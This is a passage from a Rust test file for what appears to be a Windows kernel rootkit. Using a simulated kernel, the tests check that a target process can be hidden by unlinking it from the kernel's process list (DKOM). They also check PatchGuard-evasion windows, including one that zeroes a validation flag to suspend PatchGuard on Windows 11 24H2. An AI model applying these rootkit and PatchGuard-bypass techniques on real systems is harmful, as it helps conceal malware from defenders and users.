        Err(KitError::NotFound)
    ));
}

/// Mock validation-trigger probe for the Peekaboo window (stands in for the
/// real PsSetCreateProcessNotifyRoutineEx-callback driver seam).
struct MockPeekabooProbe {
    active: bool,
    armed: bool,
}
impl PeekabooProbe for MockPeekabooProbe {
    fn validation_active(&self) -> Result<bool, KitError> {
        Ok(self.active)
    }
    fn repair_armed(&self) -> Result<bool, KitError> {
        Ok(self.armed)
    }
}

/// The offset-free PeekabooWindow is tier 1 of `select_pg_window_with_probe`
/// (preferred whenever the operator has a kernel callback seam): it covers a
/// DKOM hide for its whole lifetime and re-links on guard Drop, so
/// PspProcessDelete's bidirectional LIST_ENTRY check passes at termination —
/// all while the PG-context windows stay gated OFF (placeholder offsets).
#[test]
fn peekaboo_preferred_window_hides_and_repairs_on_drop() {
    let eproc = crate::offsets::for_build(19041).unwrap().offsets;
    let kernel = FakeKernel::new();
    let rw = VaRw(&kernel);
    build_process_list(&kernel, PS_HEAD_C, &[(E_SYS, 4), (E_TARGET, 4242)], &eproc);

    // Tiers 2–3 are unreachable here (verified-offsets gate OFF) — Peekaboo
    // is the selected strategy (the win-side selection tests pin the actual
    // probe order under wine64).
    assert!(!crate::offsets::pg_context_usable_for_window(19041));
    let probe = MockPeekabooProbe {
        active: false,
        armed: true,
    };
    let window = PeekabooWindow::new(eproc, &probe, &rw);

    // ---- DKOM hide INSIDE the window (link-preserving unlink + track) -----
    {
        let _guard = window
            .enter_unchecked(&rw)
            .expect("no validation racing + repair armed → window opens");
        PeekabooWindow::unlink_preserving_links(&rw, E_TARGET, &eproc)
            .expect("hide preserving neighbor pointers");
        window.track_hidden(E_TARGET);
        assert!(matches!(
            ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc),
            Err(KitError::NotFound)
        ));
    } // guard Drop → repair_links re-inserts the hidden entry

    // ---- End state: list consistency restored (the PspProcessDelete check) --
    assert_eq!(
        ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc).unwrap(),
        E_TARGET,
        "repair re-linked the entry — enumerable again after window close"
    );
    let link = E_TARGET + eproc.active_process_links;
    let flink = kernel.read_u64(link) as usize;
    let blink = kernel.read_u64(link + 8) as usize;
    assert_eq!(kernel.read_u64(flink + 8) as usize, link, "Flink->Blink == entry");
    assert_eq!(kernel.read_u64(blink) as usize, link, "Blink->Flink == entry");
}

#[test]
fn pg_window_refuses_during_active_validation_and_no_edit_happens() {
    let eproc = crate::offsets::for_build(19041).unwrap().offsets;
    let kernel = FakeKernel::new();
    let rw = VaRw(&kernel);
    kernel.write_u64(PRCB + 0x190, PGCTX as u64);
    kernel.write_u64(PGCTX + 0x08, 1); // PG mid-validation
    build_process_list(&kernel, PS_HEAD_C, &[(E_SYS, 4), (E_TARGET, 4242)], &eproc);

    let window = TimingRepairWindow::new(verified_pg_offsets(false), PRCB, &rw);
    assert!(
        matches!(
            window.enter_unchecked(&rw),
            Err(KitError::UnsupportedPosture(_))
        ),
        "timing-repair window must refuse while PG is validating"
    );
    // Operator aborted: the target is STILL enumerable (no partial DKOM).
    assert_eq!(
        ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc).unwrap(),
        E_TARGET
    );
}

#[test]
fn pg_window_win11_24h2_thread_suspend_long_window() {
    let eproc = crate::offsets::for_build(26100).unwrap().offsets;
    let kernel = FakeKernel::new();
    let rw = VaRw(&kernel);
    kernel.write_u64(PRCB + 0x190, PGCTX as u64);
    kernel.write_u64(PGCTX + 0x08, 1); // validation flag set before suspend
    build_process_list(&kernel, PS_HEAD_C, &[(E_SYS, 4), (E_TARGET, 4242)], &eproc);

    // Win11 24H2: thread-suspend capable → RuntimePgBypassWindow is the
    // selected window (select_pg_window's supports_thread_suspend branch).
    let window = RuntimePgBypassWindow::new(verified_pg_offsets(true), PRCB, &rw);
    {
        let _guard = window.enter_unchecked(&rw).expect("24H2 long window");
        assert_eq!(kernel.read_u64(PGCTX + 0x08), 0, "flag zeroed = PG suspended");
        let hider = ProcessHider {
            ps_active_process_head_kva: PS_HEAD_C,
            offsets: eproc,
        };
        hider.hide(&rw, 4242).expect("hide inside long window");
    } // guard Drop → repair restores the flag
    assert_eq!(
        kernel.read_u64(PGCTX + 0x08),
        1,
        "repair re-armed PG validation on guard Drop"
    );
    assert!(matches!(
        ProcessHider::find_eprocess(&rw, PS_HEAD_C, 4242, &eproc),
        Err(KitError::NotFound)
    ));
}
